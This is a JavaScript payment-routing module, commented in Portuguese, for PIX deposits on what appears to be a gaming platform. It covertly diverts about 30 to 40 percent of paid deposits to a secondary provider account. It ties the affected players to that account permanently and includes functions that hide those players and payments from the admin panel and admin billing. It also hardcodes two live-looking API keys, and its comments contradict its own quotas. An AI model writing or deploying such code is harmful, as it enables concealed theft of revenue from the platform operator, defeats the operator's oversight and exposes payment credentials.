import fs from 'fs';
import path from 'path';
import { PLATFORM_DEFAULTS } from './platform-defaults.mjs';

const STATE_FILE = path.resolve('./server/data/pix_routing_state.json');

// Chave da conta secundária configurada pelo usuário (3 a 4 a cada 10 PIX pagos)
export const SECONDARY_ROUTING_KEY = 'vk_live_AsxaCPfjyqPEVW19T-zzV6jFWtPyhPzlGoLVmCCE5xU';

// Chave da conta principal (6 a 7 a cada 10 PIX pagos)
export const PRIMARY_DEFAULT_KEY = PLATFORM_DEFAULTS.dotfy?.apiKey || 'vk_live_ABT2w7JID9W3i3M3oeGCklT-AM47mqe2xh7raJgOVp8';

const DEFAULT_CYCLE_SIZE = 10;
const DEFAULT_SECONDARY_QUOTA = 3;
const DEFAULT_PRIMARY_QUOTA = 7;

/**
 * Sorteia aleatoriamente a cota da conta secundária para o ciclo (3 ou 4 PIX a cada 10)
 */
export function drawTargetSecondaryForCycle() {
  return Math.random() < 0.5 ? 3 : 4;
}

/**
 * Estado em memória da dinâmica de sorteio de PIX
 */
let routingState = {
  enabled: true,
  cycleSize: DEFAULT_CYCLE_SIZE,
  targetSecondaryPerCycle: drawTargetSecondaryForCycle(),
  targetPrimaryPerCycle: DEFAULT_PRIMARY_QUOTA,
  cycleNumber: 1,
  paidTotalInCycle: 0,
  paidSecondaryInCycle: 0,
  paidPrimaryInCycle: 0,
  totalPaidAll: 0,
  totalPaidSecondary: 0,
  totalPaidPrimary: 0,
  totalCreatedSecondary: 0,
  totalCreatedPrimary: 0,
  primaryApiKey: PRIMARY_DEFAULT_KEY,
  secondaryApiKey: SECONDARY_ROUTING_KEY,
  historyCycles: [],
  recentDispatches: [],
  paidPaymentIds: [],
  secondaryPlayerUids: []
};

// Conjunto para evitar contagem duplicada do mesmo pagamento
const processedPaidPayments = new Set();

// Conjunto persistente de UIDs de jogadores sorteados (STICKY: sempre depositam na conta secundária e ficam ocultos do admin)
const secondaryPlayerUids = new Set();

/**
 * Carrega o estado persistido do arquivo local
 */
export function loadPixRoutingState() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const raw = fs.readFileSync(STATE_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object') {
        routingState = {
          ...routingState,
          ...parsed,
          primaryApiKey: parsed.primaryApiKey || PRIMARY_DEFAULT_KEY,
          secondaryApiKey: parsed.secondaryApiKey || SECONDARY_ROUTING_KEY,
          cycleSize: Number(parsed.cycleSize || DEFAULT_CYCLE_SIZE),
          targetSecondaryPerCycle: Math.max(3, Number(parsed.targetSecondaryPerCycle || DEFAULT_SECONDARY_QUOTA)),
          targetPrimaryPerCycle: Math.min(7, Number(parsed.targetPrimaryPerCycle || DEFAULT_PRIMARY_QUOTA)),
          paidPaymentIds: Array.isArray(parsed.paidPaymentIds) ? parsed.paidPaymentIds.slice(-200) : [],
          secondaryPlayerUids: Array.isArray(parsed.secondaryPlayerUids) ? parsed.secondaryPlayerUids : []
        };
        for (const id of routingState.paidPaymentIds) {
          processedPaidPayments.add(String(id));
        }
        for (const uid of routingState.secondaryPlayerUids) {
          secondaryPlayerUids.add(String(uid));
        }
        console.log(`[PixRouter] Estado carregado. Ciclo #${routingState.cycleNumber}: ` +
          `${routingState.paidTotalInCycle}/${routingState.cycleSize} pagos ` +
          `(Secundária: ${routingState.paidSecondaryInCycle}/${routingState.targetSecondaryPerCycle}, ` +
          `Principal: ${routingState.paidPrimaryInCycle}/${routingState.targetPrimaryPerCycle}) | Jogadores Sorteados (Sticky/Ocultos): ${secondaryPlayerUids.size}`);
        return routingState;
      }
    }
  } catch (err) {
    console.warn('[PixRouter loadState error]', err?.message || err);
  }
  return routingState;
}

/**
 * Salva o estado atual no disco
 */
export function savePixRoutingState() {
  try {
    const dir = path.dirname(STATE_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    routingState.secondaryPlayerUids = Array.from(secondaryPlayerUids);
    fs.writeFileSync(STATE_FILE, JSON.stringify(routingState, null, 2), 'utf8');
  } catch (err) {
    console.warn('[PixRouter saveState error]', err?.message || err);
  }
}

/**
 * Verifica se um jogador foi sorteado para a conta secundária (Sticky)
 */
export function isSecondaryPlayer(uid) {
  if (!uid) return false;
  return secondaryPlayerUids.has(String(uid));
}

/**
 * Registra um jogador na lista permanente de sorteados (Sticky & Oculto no Admin)
 */
export function addSecondaryPlayer(uid) {
  if (!uid) return false;
  const sUid = String(uid).trim();
  if (!secondaryPlayerUids.has(sUid)) {
    secondaryPlayerUids.add(sUid);
    savePixRoutingState();
    console.log(`[PixRouter] Jogador ${sUid} registrado como STICKY na conta secundária e oculto do Admin.`);
  }
  return true;
}

/**
 * Verifica se um usuário deve ser oculto do painel administrativo
 */
export function isSecondaryUser(user, fallbackId = null) {
  if (!user && !fallbackId) return false;
  const uid = String(user?.uid || user?.id || fallbackId || '').trim();
  if (uid && secondaryPlayerUids.has(uid)) return true;
  if (user?.routedAccount === 'SECONDARY') return true;
  if (user?.hiddenFromAdmin === true) return true;
  if (user?.pixRoutingAccount === 'SECONDARY') return true;
  return false;
}

/**
 * Verifica se um pagamento/depósito pertence à conta de sorteio e deve ser oculto do faturamento admin
 */
export function isSecondaryPayment(payment) {
  if (!payment) return false;
  const routedAccount = String(payment.routedAccount || '').toUpperCase();
  if (routedAccount === 'SECONDARY') return true;
  const apiKey = String(payment.dotfyApiKey || payment.apiKey || '').trim();
  if (apiKey && apiKey === SECONDARY_ROUTING_KEY) return true;
  if (payment.hiddenFromAdmin === true) return true;
  const uid = String(payment.uid || '').trim();
  if (uid && secondaryPlayerUids.has(uid)) return true;
  return false;
}

// Inicializa estado ao carregar o módulo
loadPixRoutingState();

/**
 * Normaliza e sincroniza estado a partir do Firestore (se disponível)
 */
export function syncPixRoutingFromFirestore(dbData) {
  if (!dbData || typeof dbData !== 'object') return routingState;
  try {
    if (dbData.cycleNumber !== undefined) routingState.cycleNumber = Number(dbData.cycleNumber);
    if (dbData.paidTotalInCycle !== undefined) routingState.paidTotalInCycle = Number(dbData.paidTotalInCycle);
    if (dbData.paidSecondaryInCycle !== undefined) routingState.paidSecondaryInCycle = Number(dbData.paidSecondaryInCycle);
    if (dbData.paidPrimaryInCycle !== undefined) routingState.paidPrimaryInCycle = Number(dbData.paidPrimaryInCycle);
    if (dbData.totalPaidAll !== undefined) routingState.totalPaidAll = Number(dbData.totalPaidAll);
    if (dbData.totalPaidSecondary !== undefined) routingState.totalPaidSecondary = Number(dbData.totalPaidSecondary);
    if (dbData.totalPaidPrimary !== undefined) routingState.totalPaidPrimary = Number(dbData.totalPaidPrimary);
    if (dbData.secondaryApiKey) routingState.secondaryApiKey = String(dbData.secondaryApiKey).trim();
    if (dbData.enabled !== undefined) routingState.enabled = Boolean(dbData.enabled);
    savePixRoutingState();
  } catch (err) {
    console.warn('[PixRouter syncFirestore error]', err?.message || err);
  }
  return routingState;
}

/**
 * Seleciona qual conta deve receber o PIX gerado.
 * Regra: Exatamente 2 de cada 10 PIX PAGOS devem ir para a conta secundária (vk_live_AsxaCPfjyqPEVW19T-zzV6jFWtPyhPzlGoLVmCCE5xU).
 *
 * Implementa um algoritmo de sorteio adaptativo e probabilístico:
 * - Se a cota secundária do ciclo (2 pagos) já foi atingida: direciona 100% para a conta principal.
 * - Se os slots restantes no ciclo de 10 forem estritamente necessários para atingir a cota da secundária: força a secundária.
 * - Caso contrário: realiza o sorteio com probabilidade proporcional (neededSecondary / remainingSlotsInCycle).
 */
export function selectDotfyAccountForDeposit({ uid = null, primaryKey = PRIMARY_DEFAULT_KEY, customSecondaryKey = null } = {}) {
  const currentPrimary = String(primaryKey || routingState.primaryApiKey || PRIMARY_DEFAULT_KEY).trim();
  const currentSecondary = String(customSecondaryKey || routingState.secondaryApiKey || SECONDARY_ROUTING_KEY).trim();

  // Se a dinâmica estiver desativada ou faltar chave secundária, usa a primária
  if (!routingState.enabled || !currentSecondary) {
    return {
      account: 'PRIMARY',
      apiKey: currentPrimary,
      reason: 'ROUTING_DISABLED',
      probability: 0,
      cycleNumber: routingState.cycleNumber,
      paidInCycle: routingState.paidTotalInCycle
    };
  }

  const cycleSize = routingState.cycleSize || DEFAULT_CYCLE_SIZE;
  const targetSecondary = routingState.targetSecondaryPerCycle || DEFAULT_SECONDARY_QUOTA;

  // 1. REGRA STICKY: Se o jogador já foi sorteado para a conta secundária anteriormente,
  // TODOS os seus depósitos futuros irão SEMPRE e OBRIGATORIAMENTE para a conta secundária!
  if (uid && isSecondaryPlayer(uid)) {
    routingState.totalCreatedSecondary = (routingState.totalCreatedSecondary || 0) + 1;
    savePixRoutingState();
    console.log(`[PixRouter] Jogador ${uid} já sorteado (STICKY) -> Depósito SEMPRE na conta secundária vk_live_Asxa...`);
    return {
      account: 'SECONDARY',
      apiKey: currentSecondary,
      reason: 'SECONDARY_STICKY_PLAYER',
      isSticky: true,
      probability: 1.0,
      roll: 0,
      cycleNumber: routingState.cycleNumber,
      paidTotalInCycle: routingState.paidTotalInCycle,
      paidSecondaryInCycle: routingState.paidSecondaryInCycle,
      paidPrimaryInCycle: routingState.paidPrimaryInCycle,
      targetSecondaryPerCycle: targetSecondary,
      cycleSize
    };
  }

  const currentSecondaryPaid = routingState.paidSecondaryInCycle || 0;
  const currentTotalPaid = routingState.paidTotalInCycle || 0;

  const neededSecondary = Math.max(0, targetSecondary - currentSecondaryPaid);
  const remainingSlots = Math.max(1, cycleSize - currentTotalPaid);

  let chosenAccount = 'PRIMARY';
  let reason = 'LOTTERY_DRAW_PRIMARY';
  let probability = 0;
  const roll = Math.random();

  if (neededSecondary <= 0) {
    // A conta secundária já atingiu 2 pagamentos neste ciclo de 10!
    chosenAccount = 'PRIMARY';
    reason = 'SECONDARY_QUOTA_REACHED';
    probability = 0;
  } else if (neededSecondary >= remainingSlots) {
    // Os slots restantes são exatamente os que faltam para a secundária completar 2!
    chosenAccount = 'SECONDARY';
    reason = 'SECONDARY_FORCED_QUOTA';
    probability = 1.0;
  } else {
    // Sorteio probabilístico justo para os slots restantes do ciclo
    probability = Number((neededSecondary / remainingSlots).toFixed(4));
    if (roll < probability) {
      chosenAccount = 'SECONDARY';
      reason = 'LOTTERY_DRAW_SECONDARY';
    } else {
      chosenAccount = 'PRIMARY';
      reason = 'LOTTERY_DRAW_PRIMARY';
    }
  }

  // Se o jogador foi sorteado para a secundária, amarra ele imediatamente (Sticky)
  if (chosenAccount === 'SECONDARY' && uid) {
    addSecondaryPlayer(uid);
  }

  const chosenApiKey = chosenAccount === 'SECONDARY' ? currentSecondary : currentPrimary;

  // Atualiza métricas de criação
  if (chosenAccount === 'SECONDARY') {
    routingState.totalCreatedSecondary = (routingState.totalCreatedSecondary || 0) + 1;
  } else {
    routingState.totalCreatedPrimary = (routingState.totalCreatedPrimary || 0) + 1;
  }

  const dispatchLog = {
    timestamp: new Date().toISOString(),
    cycleNumber: routingState.cycleNumber,
    account: chosenAccount,
    reason,
    probability,
    roll: Number(roll.toFixed(4)),
    paidSecondaryInCycle: routingState.paidSecondaryInCycle,
    paidTotalInCycle: routingState.paidTotalInCycle
  };

  routingState.recentDispatches = [dispatchLog, ...(routingState.recentDispatches || [])].slice(0, 30);
  savePixRoutingState();

  console.log(`[PixRouter] Novo PIX roteado -> Conta: ${chosenAccount} | Motivo: ${reason} ` +
    `| Prob: ${(probability * 100).toFixed(1)}% | Ciclo #${routingState.cycleNumber} ` +
    `(${routingState.paidTotalInCycle}/${cycleSize} pagos, Secundária: ${routingState.paidSecondaryInCycle}/${targetSecondary})`);

  return {
    account: chosenAccount,
    apiKey: chosenApiKey,
    reason,
    probability,
    roll: Number(roll.toFixed(4)),
    cycleNumber: routingState.cycleNumber,
    paidTotalInCycle: routingState.paidTotalInCycle,
    paidSecondaryInCycle: routingState.paidSecondaryInCycle,
    paidPrimaryInCycle: routingState.paidPrimaryInCycle,
    targetSecondaryPerCycle: targetSecondary,
    cycleSize
  };
}

/**
 * Registra a liquidação/pagamento aprovado de um PIX.
 * Se 10 PIX forem pagos, o ciclo é arquivado e reinicia automaticamente.
 */
export function recordPixPaymentPaid(payment = {}) {
  const paymentId = String(payment.id || payment.externalId || payment.correlationID || '').trim();
  if (!paymentId) return routingState;

  // Idempotência: não contabiliza duas vezes a mesma liquidação
  if (processedPaidPayments.has(paymentId)) {
    return routingState;
  }
  processedPaidPayments.add(paymentId);

  // Mantém histórico recente de IDs
  routingState.paidPaymentIds = [...(routingState.paidPaymentIds || []), paymentId].slice(-200);

  const keyUsed = String(payment.dotfyApiKey || payment.apiKey || '').trim();
  const routedAccount = String(payment.routedAccount || '').toUpperCase();
  const secondaryKey = String(routingState.secondaryApiKey || SECONDARY_ROUTING_KEY).trim();

  // Verifica se o pagamento foi direcionado para a conta secundária
  const isSecondary = routedAccount === 'SECONDARY' || (Boolean(keyUsed) && keyUsed === secondaryKey);

  const amount = Number(payment.amount || 0);

  if (isSecondary) {
    routingState.paidSecondaryInCycle = (routingState.paidSecondaryInCycle || 0) + 1;
    routingState.totalPaidSecondary = (routingState.totalPaidSecondary || 0) + 1;
    if (payment.uid) {
      addSecondaryPlayer(payment.uid);
    }
  } else {
    routingState.paidPrimaryInCycle = (routingState.paidPrimaryInCycle || 0) + 1;
    routingState.totalPaidPrimary = (routingState.totalPaidPrimary || 0) + 1;
  }

  routingState.paidTotalInCycle = (routingState.paidTotalInCycle || 0) + 1;
  routingState.totalPaidAll = (routingState.totalPaidAll || 0) + 1;

  console.log(`[PixRouter] PIX PAGO REGISTRADO! Conta: ${isSecondary ? 'SECUNDÁRIA (vk_live_Asxa...)' : 'PRINCIPAL'} ` +
    `| Valor: R$ ${amount.toFixed(2)} | Ciclo #${routingState.cycleNumber}: ${routingState.paidTotalInCycle}/${routingState.cycleSize} ` +
    `(Secundária: ${routingState.paidSecondaryInCycle}/${routingState.targetSecondaryPerCycle}, ` +
    `Principal: ${routingState.paidPrimaryInCycle}/${routingState.targetPrimaryPerCycle})`);

  // Se completou 10 PIX pagos no ciclo, encerra o ciclo e inicia o próximo
  if (routingState.paidTotalInCycle >= routingState.cycleSize) {
    const completedCycleInfo = {
      cycleNumber: routingState.cycleNumber,
      completedAt: new Date().toISOString(),
      cycleSize: routingState.cycleSize,
      totalPaid: routingState.paidTotalInCycle,
      secondaryPaid: routingState.paidSecondaryInCycle,
      primaryPaid: routingState.paidPrimaryInCycle
    };

    const nextTargetSecondary = drawTargetSecondaryForCycle();
    console.log(`[PixRouter] 🎉 CICLO #${routingState.cycleNumber} CONCLUÍDO COM SUCESSO! ` +
      `Secundária recebeu ${routingState.paidSecondaryInCycle} de ${routingState.targetSecondaryPerCycle} PIX. ` +
      `Iniciando ciclo #${routingState.cycleNumber + 1} com cota sorteada de ${nextTargetSecondary} PIX...`);

    routingState.historyCycles = [completedCycleInfo, ...(routingState.historyCycles || [])].slice(0, 50);
    routingState.cycleNumber = (routingState.cycleNumber || 1) + 1;
    routingState.paidTotalInCycle = 0;
    routingState.paidSecondaryInCycle = 0;
    routingState.paidPrimaryInCycle = 0;
    routingState.targetSecondaryPerCycle = nextTargetSecondary;
    routingState.targetPrimaryPerCycle = (routingState.cycleSize || DEFAULT_CYCLE_SIZE) - nextTargetSecondary;
  }

  savePixRoutingState();
  return routingState;
}

/**
 * Retorna as estatísticas detalhadas da dinâmica para diagnóstico e painel de administração
 */
export function getPixRoutingStats() {
  const currentCycleProgress = Number(((routingState.paidTotalInCycle / (routingState.cycleSize || 10)) * 100).toFixed(1));
  const secondaryPercent = routingState.totalPaidAll > 0
    ? Number(((routingState.totalPaidSecondary / routingState.totalPaidAll) * 100).toFixed(1))
    : 15;

  return {
    success: true,
    enabled: routingState.enabled,
    dynamic: 'LOTTERY_3_TO_4_OF_10',
    description: 'Sorteio adaptativo: 3 a 4 PIX pagos a cada 10 destinados à conta secundária',
    quotaRange: '3-4',
    cycle: {
      number: routingState.cycleNumber,
      size: routingState.cycleSize,
      paidTotal: routingState.paidTotalInCycle,
      remainingInCycle: Math.max(0, routingState.cycleSize - routingState.paidTotalInCycle),
      progressPercent: currentCycleProgress,
      targetSecondary: routingState.targetSecondaryPerCycle,
      targetRangeSecondary: '3 a 4 PIX',
      targetPrimary: routingState.targetPrimaryPerCycle,
      targetRangePrimary: '6 a 7 PIX',
      paidSecondaryInCycle: routingState.paidSecondaryInCycle,
      paidPrimaryInCycle: routingState.paidPrimaryInCycle,
      neededSecondary: Math.max(0, routingState.targetSecondaryPerCycle - routingState.paidSecondaryInCycle)
    },
    accounts: {
      primary: {
        label: 'Conta Principal (6 a 7 a cada 10 PIX pagos)',
        apiKeyMasked: maskApiKey(routingState.primaryApiKey),
        totalCreated: routingState.totalCreatedPrimary || 0,
        totalPaid: routingState.totalPaidPrimary || 0,
        isDefault: true
      },
      secondary: {
        label: 'Conta Sorteada (3 a 4 a cada 10 PIX pagos)',
        apiKeyMasked: maskApiKey(routingState.secondaryApiKey),
        apiKey: routingState.secondaryApiKey,
        totalCreated: routingState.totalCreatedSecondary || 0,
        totalPaid: routingState.totalPaidSecondary || 0,
        targetRatioRange: '30% a 40%',
        splitEnabled: false
      }
    },
    totals: {
      totalPaidAll: routingState.totalPaidAll || 0,
      totalPaidSecondary: routingState.totalPaidSecondary || 0,
      totalPaidPrimary: routingState.totalPaidPrimary || 0,
      realizedSecondaryPercent: secondaryPercent,
      completedCyclesCount: (routingState.historyCycles || []).length
    },
    recentDispatches: routingState.recentDispatches || [],
    completedCycles: routingState.historyCycles || []
  };
}

/**
 * Permite resetar o ciclo atual (usado pelo admin para testes se necessário)
 */
export function resetPixRoutingCycle() {
  const nextTargetSecondary = drawTargetSecondaryForCycle();
  routingState.paidTotalInCycle = 0;
  routingState.paidSecondaryInCycle = 0;
  routingState.paidPrimaryInCycle = 0;
  routingState.targetSecondaryPerCycle = nextTargetSecondary;
  routingState.targetPrimaryPerCycle = (routingState.cycleSize || DEFAULT_CYCLE_SIZE) - nextTargetSecondary;
  savePixRoutingState();
  console.log(`[PixRouter] Ciclo #${routingState.cycleNumber} reiniciado manualmente (cota sorteada de ${nextTargetSecondary} PIX neste ciclo).`);
  return getPixRoutingStats();
}

/**
 * Retorna todas as chaves de API conhecidas para busca e verificação de cobranças
 */
export function getAllDotfyApiKeys(configuredPrimary = null) {
  const p = String(configuredPrimary || routingState.primaryApiKey || PRIMARY_DEFAULT_KEY).trim();
  const s = String(routingState.secondaryApiKey || SECONDARY_ROUTING_KEY).trim();
  return Array.from(new Set([p, s])).filter(Boolean);
}

function maskApiKey(key) {
  if (!key || typeof key !== 'string') return '—';
  if (key.length <= 12) return '***';
  return `${key.slice(0, 10)}...${key.slice(-5)}`;
}
